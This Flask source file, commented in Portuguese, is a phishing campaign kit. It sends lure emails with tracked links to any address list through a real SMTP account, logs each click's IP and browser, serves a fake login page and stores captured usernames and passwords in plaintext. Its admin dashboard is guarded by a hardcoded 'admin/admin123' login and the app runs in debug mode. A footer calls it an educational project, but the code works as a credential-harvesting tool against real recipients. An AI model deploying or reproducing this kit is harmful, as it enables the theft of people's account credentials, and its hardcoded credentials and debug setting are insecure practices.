from flask import Flask, request, render_template
import sqlite3
import os
import uuid
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from config import SMTP_SERVER, SMTP_PORT, SMTP_USER, SMTP_PASSWORD

app = Flask(__name__)

# Configuração do banco de dados
def init_db():
    db_path = 'database.db'
    if os.path.exists(db_path):
        os.remove(db_path)
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clicks
                (user_id TEXT, ip TEXT, browser TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logins
                (user_id TEXT, username TEXT, password TEXT, ip TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()
    print("Banco de dados inicializado com sucesso.")

init_db()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/campaign')
def campaign():
    return render_template('campaign.html')

@app.route('/start_campaign', methods=['POST'])
def start_campaign():
    emails = request.form.get('emails').splitlines()
    method = request.form.get('method')
    smtp_user = request.form.get('smtp_user')
    smtp_password = request.form.get('smtp_password')
    
    if not emails:
        return "Erro: Forneça pelo menos um e-mail", 400
    
    results = []
    for email in emails:
        email = email.strip()
        if not email or '@' not in email:
            results.append(f"Erro: E-mail inválido ({email})")
            continue
        
        user_id = str(uuid.uuid4())
        link = f"http://127.0.0.1:5000/login?user_id={user_id}"
        
        with open('templates/email.html', 'r') as f:
            email_content = f.read().replace('{{link}}', link)
        
        if method == 'simulate':
            try:
                with open('simulated_emails.txt', 'a') as f:
                    f.write(f"Para: {email}\nAssunto: Atualize sua conta agora!\nLink: {link}\nConteúdo:\n{email_content}\n---\n")
                results.append(f"E-mail simulado para {email}: <a href='{link}'>{link}</a>")
            except Exception as e:
                results.append(f"Erro ao simular e-mail para {email}: {str(e)}")
        else:  # method == 'smtp'
            if not smtp_user or not smtp_password or '@outlook.com' not in smtp_user.lower():
                results.append("Erro: Use uma conta Outlook válida (ex.: seu-email@outlook.com)")
                continue
            
            msg = MIMEText(email_content, 'html')
            msg['Subject'] = 'Atualize sua conta agora!'
            msg['From'] = smtp_user
            msg['To'] = email
            
            try:
                with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                    server.starttls()
                    server.login(smtp_user, smtp_password)
                    server.sendmail(smtp_user, email, msg.as_string())
                results.append(f"E-mail enviado para {email}: <a href='{link}'>{link}</a>")
            except smtplib.SMTPAuthenticationError:
                results.append(f"Erro ao enviar e-mail para {email}: Credenciais Outlook inválidas. Verifique a senha ou use uma senha de aplicativo.")
            except Exception as e:
                results.append(f"Erro ao enviar e-mail para {email}: {str(e)}")
    
    return f"""
    <html>
    <head><link rel="stylesheet" href="/static/style.css"></head>
    <body>
    <div class="container">
    <h2>Resultados da Campanha</h2>
    <ul class="tips">
    {"".join(f"<li>{result}</li>" for result in results)}
    </ul>
    <p><a href="/campaign">Nova Campanha</a> | <a href="/admin">Ver Dashboard</a></p>
    <div class="footer">
    <p>Projeto educacional. Verifique os resultados no dashboard.</p>
    </div>
    </div>
    </body>
    </html>
    """

@app.route('/send_email', methods=['GET'])
def send_email():
    recipient = request.args.get('email')
    if not recipient or not '@' in recipient:
        return "Erro: Forneça um endereço de e-mail válido", 400
    
    print(f"Simulando envio para {recipient}")
    user_id = str(uuid.uuid4())
    link = f"http://127.0.0.1:5000/login?user_id={user_id}"
    
    with open('templates/email.html', 'r') as f:
        email_content = f.read().replace('{{link}}', link)
    
    try:
        with open('simulated_emails.txt', 'a') as f:
            f.write(f"Para: {recipient}\nAssunto: Atualize sua conta agora!\nLink: {link}\nConteúdo:\n{email_content}\n---\n")
        print(f"E-mail simulado para {recipient}. Link: {link}")
        return f"""
        <html>
        <head><link rel="stylesheet" href="/static/style.css"></head>
        <body>
        <div class="container">
        <h2>E-mail Simulado</h2>
        <p>E-mail simulado com sucesso para {recipient}!</p>
        <p>Clique no link para testar: <a href='{link}'>{link}</a></p>
        <p>Link também salvo em simulated_emails.txt.</p>
        <p><a href="/campaign">Configurar Nova Campanha</a></p>
        </div>
        </body>
        </html>
        """
    except Exception as e:
        print(f"Erro ao simular e-mail: {str(e)}")
        return f"Erro ao simular e-mail: {str(e)}"

@app.route('/login')
def login():
    user_id = request.args.get('user_id')
    if not user_id:
        return "Erro: user_id inválido", 400
    
    ip = request.remote_addr
    browser = request.user_agent.string
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    with sqlite3.connect('database.db') as conn:
        c = conn.cursor()
        c.execute("INSERT INTO clicks (user_id, ip, browser, timestamp) VALUES (?, ?, ?, ?)", 
                  (user_id, ip, browser, timestamp))
        conn.commit()
    
    return render_template('login.html', user_id=user_id)

@app.route('/submit_login', methods=['POST'])
def submit_login():
    user_id = request.form.get('user_id')
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not user_id or not username:
        return "Erro: parâmetros inválidos", 400
    
    ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    with sqlite3.connect('database.db') as conn:
        c = conn.cursor()
        c.execute("INSERT INTO logins (user_id, username, password, ip, timestamp) VALUES (?, ?, ?, ?, ?)", 
                  (user_id, username, password, ip, timestamp))
        conn.commit()
    
    return render_template('result.html')

@app.route('/admin')
def admin():
    if request.remote_addr != '127.0.0.1':
        return render_template('admin_login.html')
    
    with sqlite3.connect('database.db') as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM clicks")
        clicks = c.fetchall()
        c.execute("SELECT * FROM logins")
        logins = c.fetchall()
        c.execute("SELECT ip, COUNT(*) as count FROM clicks GROUP BY ip")
        ip_counts = c.fetchall()
    
    return render_template('admin.html', clicks=clicks, logins=logins, ip_counts=ip_counts)

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == 'admin' and password == 'admin123':
            with sqlite3.connect('database.db') as conn:
                c = conn.cursor()
                c.execute("SELECT * FROM clicks")
                clicks = c.fetchall()
                c.execute("SELECT * FROM logins")
                logins = c.fetchall()
                c.execute("SELECT ip, COUNT(*) as count FROM clicks GROUP BY ip")
                ip_counts = c.fetchall()
            return render_template('admin.html', clicks=clicks, logins=logins, ip_counts=ip_counts)
        else:
            return "Erro: Credenciais inválidas", 401
    return render_template('admin_login.html')

if __name__ == '__main__':
    app.run(debug=True)